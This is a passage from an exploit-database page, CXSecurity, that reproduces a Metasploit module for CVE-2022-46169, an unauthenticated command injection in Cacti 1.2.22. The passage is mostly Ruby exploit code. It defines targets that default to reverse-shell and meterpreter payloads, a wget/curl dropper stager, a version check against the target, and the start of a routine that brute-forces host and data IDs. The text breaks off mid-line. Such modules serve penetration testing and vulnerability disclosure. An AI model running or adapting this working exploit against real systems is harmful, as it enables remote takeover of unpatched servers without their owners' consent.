---
title: Cacti 1.2.22 Command Injection
url: https://cxsecurity.com/issue/WLB-2023010044
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-25
fetch_date: 2025-10-04T04:42:53.859818
---

# Cacti 1.2.22 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Cacti 1.2.22 Command Injection** **2023.01.24**  Credit:  **[mr\_me](https://cxsecurity.com/author/mr_me/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-46169](https://cxsecurity.com/cveshow/CVE-2022-46169/ "Click to see CVE-2022-46169")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Cacti 1.2.22 unauthenticated command injection',
'Description' => %q{
This module exploits an unauthenticated command injection
vulnerability in Cacti through 1.2.22 (CVE-2022-46169) in
order to achieve unauthenticated remote code execution as the
www-data user.
The module first attempts to obtain the Cacti version to see
if the target is affected. If LOCAL\_DATA\_ID and/or HOST\_ID
are not set, the module will try to bruteforce the missing
value(s). If a valid combination is found, the module will
use these to attempt exploitation. If LOCAL\_DATA\_ID and/or
HOST\_ID are both set, the module will immediately attempt
exploitation.
During exploitation, the module sends a GET request to
/remote\_agent.php with the action parameter set to polldata
and the X-Forwarded-For header set to the provided value for
X\_FORWARDED\_FOR\_IP (by default 127.0.0.1). In addition, the
poller\_id parameter is set to the payload and the host\_id
and local\_data\_id parameters are set to the bruteforced or
provided values. If X\_FORWARDED\_FOR\_IP is set to an address
that is resolvable to a hostname in the poller table, and the
local\_data\_id and host\_id values are vulnerable, the payload
set for poller\_id will be executed by the target.
This module has been successfully tested against Cacti
version 1.2.22 running on Ubuntu 21.10 (vulhub docker image)
},
'License' => MSF\_LICENSE,
'Author' => [
'Stefan Schiller', # discovery (independent of Steven Seeley)
'Steven Seeley', # (mr\_me) @steventseeley - discovery (independent of Stefan Schiller)
'Owen Gong', # @phithon\_xg - vulhub PoC
'Erik Wynter' # @wyntererik - Metasploit
],
'References' => [
['CVE', '2022-46169'],
['URL', 'https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf'], # disclosure and technical details
['URL', 'https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169'], # vulhub vulnerable docker image and PoC
['URL', 'https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution'] # analysis by Stefan Schiller
],
'DefaultOptions' => {
'RPORT' => 8080
},
'Platform' => %w[unix linux],
'Arch' => [ARCH\_CMD, ARCH\_X86, ARCH\_X64],
'Targets' => [
[
'Automatic (Unix In-Memory)',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse\_bash' },
'Type' => :unix\_memory
}
],
[
'Automatic (Linux Dropper)',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'CmdStagerFlavor' => ['echo', 'printf', 'wget', 'curl'],
'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse\_tcp' },
'Type' => :linux\_dropper
}
]
],
'Privileged' => false,
'DisclosureDate' => '2022-12-05',
'DefaultTarget' => 1,
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ],
'Reliability' => [ REPEATABLE\_SESSION ]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'The base path to Cacti', '/']),
OptString.new('X\_FORWARDED\_FOR\_IP', [true, 'The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to a hostname in the poller table.', '127.0.0.1']),
OptInt.new('HOST\_ID', [false, 'The host\_id value to use. By default, the module will try to bruteforce this.']),
OptInt.new('LOCAL\_DATA\_ID', [false, 'The local\_data\_id value to use. By default, the module will try to bruteforce this.'])
])
register\_advanced\_options([
OptInt.new('MIN\_HOST\_ID', [true, 'Lower value for the range of possible host\_id values to check for', 1]),
OptInt.new('MAX\_HOST\_ID', [true, 'Upper value for the range of possible host\_id values to check for', 5]),
OptInt.new('MIN\_LOCAL\_DATA\_ID', [true, 'Lower value for the range of possible local\_data\_id values to check for', 1]),
OptInt.new('MAX\_LOCAL\_DATA\_ID', [true, 'Upper value for the range of possible local\_data\_id values to check for', 100])
])
end
def check
# sanity check to see if the target is likely Cacti
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path)
})
unless res
return CheckCode::Unknown('Connection failed.')
end
unless res.code == 200 && res.body.include?('<title>Login to Cacti')
return CheckCode::Safe('Target is not a Cacti application.')
end
# get the version
version = res.body.scan(/Version (.\*?) \| \(c\)/)&.flatten&.first
if version.blank?
return CheckCode::Detected('Could not determine the Cacti version: the HTTP response body did not match the expected format.')
end
begin
if Rex::Version.new(version) <= Rex::Version.new('1.2.22')
return CheckCode::Appears("The target is Cacti version #{version}")
else
return CheckCode::Safe("The target is Cacti version #{version}")
end
rescue StandardError => e
return CheckCode::Unknown("Failed to obtain a valid Cacti version: #{e}")
end
end
def exploitable\_rrd\_names
[
'apache\_total\_kbytes',
'apache\_total\_hits',
'apache\_total\_hits',
'apache\_total\_kbytes',
'apache\_cpuload',
'boost\_avg\_size',
'boost\_peak\_memory',
'boost\_records',
'boost\_table',
'ExportDuration',
'ExportGraphs',
'syslogRuntime',
'tholdRuntime',
'polling\_time',
'uptime',
]
end
def brute\_force\_ids
# perform a sanity check first
if @host\_id
host\_ids = [@host\_id]
else
if datastore['MAX\_HOST\_ID'] < datastore['MIN\_HOST\_ID']
fail\_with(Failure::BadConfig, 'The value for MAX\_HOST\_ID is lower than MIN\_HOST\_ID. This is impossible')
end
host\_ids = (datastore['MIN\_HOST\_ID']..d...